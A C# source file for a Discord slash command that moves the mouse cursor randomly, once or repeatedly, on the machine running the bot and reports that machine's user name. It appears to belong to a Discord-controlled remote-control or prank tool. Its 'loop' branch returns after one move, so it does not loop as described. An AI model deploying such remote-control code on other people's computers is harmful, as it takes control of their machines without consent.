using Discord;
using Discord.WebSocket;
using Paroxysm.Discord.Commands.Models;
using Paroxysm.Hooks.Actions;
using Paroxysm.Tools;

namespace Paroxysm.Discord.Commands;

public class CursorCmd : ISlashCommand
{
    public SlashCommandOptions Options()
    {
        return new SlashCommandOptions
        {
            Name = "cursor",
            Description =
                "Zmienia pozycje kursora.",
            Params = new SlashCommandOptionParams
            {
                Name = "option",
                Description =
                    "Shoot - zmienia raz | loop - Zmienia w nieskończoność póki znów nie zostanie użyte !cursor loop.",
                Type = ApplicationCommandOptionType.String,
                ChoiceOptions = new[] { "shoot", "loop" },
                IsRequired = true,
                IsChoiceEnable = true
            }
        };
    }

    public Embed Execute(SocketSlashCommandData? parameters)
    {
        if (parameters is null)
        {
            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
                "Incorrect option parameters.", Environment.UserName, null);
        }

        var availableOptions = parameters.Options.ElementAt(0).Value as string;
        switch (availableOptions)
        {
            case "shoot":
                MoveCursorAction.Follow();

                return EmbedCreator.CreateWithText(Color.Green, "Command was executed successfully",
                    "Mouse has been moved to random position on the screen.", Environment.UserName, null);
            case "loop":
            {
                Random random = new();
                Settings.CursorRandom = !Settings.CursorRandom;
                while (Settings.CursorRandom)
                {
                    MoveCursorAction.Follow();
                    Thread.Sleep(random.Next(Settings.CursorMinTime, Settings.CursorMaxTime));

                    return EmbedCreator.CreateWithText(Color.Green, "Command was executed successfully",
                        "Mouse moving loop has been set, working...", Environment.UserName, null);
                }

                break;
            }
        }

        return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
            "Unknown error. Unable to move mouse.", Environment.UserName, null);
    }
}